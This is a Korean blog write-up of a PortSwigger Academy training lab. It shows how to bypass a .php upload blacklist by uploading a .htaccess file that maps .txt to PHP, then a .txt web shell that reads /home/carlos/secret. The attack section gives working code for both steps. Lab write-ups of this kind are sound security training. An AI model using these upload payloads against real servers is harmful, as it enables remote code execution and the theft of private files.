---
title: "[Write-up] PortSwigger Academy - Web shell upload via extension blacklist bypass Lab"
date: 2026-03-08 00:00:00 +09:00
categories: [Web, File Upload]
tag: [File Upload, Write-up, PortSwigger Academy]
---

### 문제 설명
![1](../assets/img/Extension%20blacklist%20bypass/1.png)
- 이미지 업로드 기능이 존재하며, 특정 파일 확장자는 블랙리스트 방식으로 업로드가 차단된다.
- 하지만 블랙리스트 설정에 취약점이 있어 확장자 우회가 가능하다.
- `wiener:peter` 계정으로 로그인이 가능하다.
- 목표 : PHP 웹셸을 업로드하여 `/home/carlos/secret` 파일의 secret 값을 획득

### 취약점 분석
Lab에 접속한 뒤 제공된 계정 정보(wiener:peter)로 로그인하면 다음과 같은 페이지를 확인할 수 있다. 로그인한 사용자의 ID가 표시되며 이메일 변경 기능, 파일 업로드 기능을 포함하고 있다.
![2](../assets/img/Extension%20blacklist%20bypass/2.png)

먼저 파일 업로드 취약점 여부를 확인하기 위해, 파일 내용을 읽을 수 있는 코드를 포함한 PHP 웹셸 파일을 작성한 뒤 업로드를 시도했다. 하지만 php 파일은 허용되지 않는다는 에러 메시지와 함께 웹셸 파일을 업로드할 수 없었다.  
```php
# shell.php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
![3](../assets/img/Extension%20blacklist%20bypass/3.png)

업로드 가능한 파일 유형을 확인하기 위해 파일의 확장자를 변경하여 업로드를 다시 시도했다. 그 결과 `.php5, .txt, .jpg` 등의 확장자 파일은 정상적으로 업로드되는 것을 확인할 수 있었다.  

하지만 업로드한 파일에 접근하여 응답을 확인한 결과, 코드 실행 결과가 아닌 코드 내용이 그대로 출력되는 것을 확인할 수 있었다. 
![4](../assets/img/Extension%20blacklist%20bypass/4.png)
![5](../assets/img/Extension%20blacklist%20bypass/5.png)

이를 통해 서버 측에서 .php 확장자에 대해서만 블랙리스트 기반 필터링이 적용되고 있으며, 다른 확장자 파일은 업로드는 가능하지만 PHP 코드가 실행되지 않는 것으로 추측할 수 있다.  

서버에서 .php 확장자만 차단하고 있기 때문에, 디렉터리 설정 파일인 `.htaccess` 파일을 업로드하여 다른 확장자 파일을 PHP로 실행하는 방법으로 공격을 시도했다. 

### 공격 과정
(1) .htaccess 파일 업로드  
디렉터리의 .txt 확장자 파일을 PHP로 실행하도록 설정
```
# .htaccess
AddType application/x-httpd-php .txt
```

(2) 웹셸 파일 업로드  
.txt 확장자 웹셸 파일 업로드
```
# shell.txt
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### 공격 결과
.txt 확장자 웹셸 파일을 업로드한 후 해당 파일에 접근한 결과, 다음과 같이 `/home/carlos/secret` 파일의 secret 값을 획득할 수 있었다.  
![6](../assets/img/Extension%20blacklist%20bypass/6.png)
